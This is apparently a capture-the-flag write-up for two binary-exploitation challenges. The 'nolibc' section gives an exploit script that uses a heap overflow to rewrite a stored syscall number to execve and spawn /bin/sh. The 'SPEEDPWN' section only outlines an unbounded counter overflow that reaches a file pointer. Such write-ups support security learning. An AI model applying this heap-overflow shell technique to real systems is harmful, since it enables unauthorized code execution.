## nolibc

use `create_string` to overflow the heap directly. After registering, the size of `forest_chunk` is still `0xbf80`. From `create_string`, we can fill up the heap with `0xbf * 0x100` chunks. The last chunk left, `0x80`, will be used to overflow.

Note that we need to make a bit of space for the `malloc(0x20)` call when reading in the filename, if not the program will crash.

```
for i in range(0xbf):  
    print(i)  
    create_string(0xef, b"asdf")  
  
payload = b"a"*0x70  
payload += p32(0x0)  
payload += p32(0x1)  
payload += p32(0x3b)  
payload += p32(0x3)  
create_string(0x7f, payload)  
  
# make space  
delete_string(0)  
  
p.sendlineafter(b"Choose an option", b"5")  
p.sendline(b"/bin/sh")
```

since the porgrams have saved syscall numbers in global section, we had to perform heap overflow and change the open syscall nubmer 1 to 59 for execve and call load string from file function after naming a file '/bin/sh' .

## SPEEDPWN

In `fight_bot`, after winning or losing a game, `game_history` is updated by setting the current bit to 1 or 0 respectively, and then incrementing current bit by 1. There’s no bound to the current bit, so we can overflow and control everything after `game_history`

overwriting `seed_generator` will allow us to control a file pointer

